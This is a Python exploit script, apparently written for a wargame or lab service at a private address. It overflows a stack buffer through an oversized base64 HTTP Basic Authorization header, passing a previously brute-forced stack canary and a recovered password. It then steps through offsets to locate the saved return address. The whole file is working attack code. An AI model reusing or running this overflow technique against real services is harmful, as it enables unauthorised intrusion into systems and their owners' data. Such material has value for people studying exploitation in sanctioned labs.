#!/usr/bin/python

import os, socket, struct, base64, sys, time

# At this stage, we have:
#  recovered the password
#  bruteforced the stack-canary

pack = lambda dword: struct.pack('I', dword)

def savetest(num, req):
    with open("{}".format(num), 'w') as case:
        case.write(req)

def main():
    target=("192.168.1.6", 20004)

    if len(sys.argv) < 3:
        print("{} password canary".format(sys.argv[0]))
        return 1

    pw=sys.argv[1]
    canary=pack(int(sys.argv[2], base=16))
    if not pw:
        print("check PASS environment variable")
        return 1

    authskel=b"pad:"+bytes(pw, 'utf8')
    reqskel="GET / HTTP/1.0\r\nAuthorization: Basic {}\r\n\r\n"

    payload = lambda fuzz: base64.encodestring(authskel+fuzz).replace(b'\n', b'')

    first_half=2028
    MAX=40
    for i in range(0, MAX, 4):
        fuzz=(b'a'*first_half)+canary+ b'b'*i + pack(i)
        p = payload(fuzz)
        while len(p) % 4 != 0:
            p+=b"="
        req=reqskel.format(str(p, 'utf8'))
        
        with socket.create_connection(target) as s:
            s.send(bytes(req, 'utf8'))
            try:
                r=s.recv(2048)
                print("[i] {}/{} - {}".format(i, MAX, str(r[:32], "utf8")), end="")
                sys.stdout.flush()
            except Exception:
                print("[i] You done goofd.")
                savetest(i, req)
                continue
    return 0

exit(main())
